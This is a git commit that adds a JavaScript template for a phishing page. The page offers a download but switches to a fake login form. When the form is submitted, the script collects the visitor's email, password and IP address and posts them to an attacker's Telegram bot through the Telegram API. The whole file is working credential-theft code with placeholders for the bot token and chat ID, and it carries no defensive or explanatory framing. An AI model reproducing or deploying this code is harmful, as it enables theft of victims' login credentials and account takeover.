b97d1d33da5644d00b4e856c2f08d1d812f9b313
YUDAMODS <119145280+YUDAMODS@users.noreply.github.com>
2024-11-27 12:10:09 +0700

    Add files via upload

---
+++ templates/main.template.js
@@ -0,0 +1,31 @@
+const downloadBtn = document.getElementById('downloadBtn');
+const downloadPage = document.getElementById('downloadPage');
+const loginPage = document.getElementById('loginPage');
+
+downloadBtn.addEventListener('click', function(event) {
+    event.preventDefault();
+    downloadPage.style.display = 'none';
+    loginPage.style.display = 'block';
+});
+
+document.getElementById('loginForm').addEventListener('submit', async function(event) {
+    event.preventDefault();
+
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    const ipResponse = await fetch('https://ipapi.co/json/');
+    const ipData = await ipResponse.json();
+
+    const botToken = '{{botToken}}';
+    const chatId = '{{chatId}}';
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: `Email: ${email}\nPassword: ${password}\nIP: ${ipData.ip}`
+        })
+    });
+});
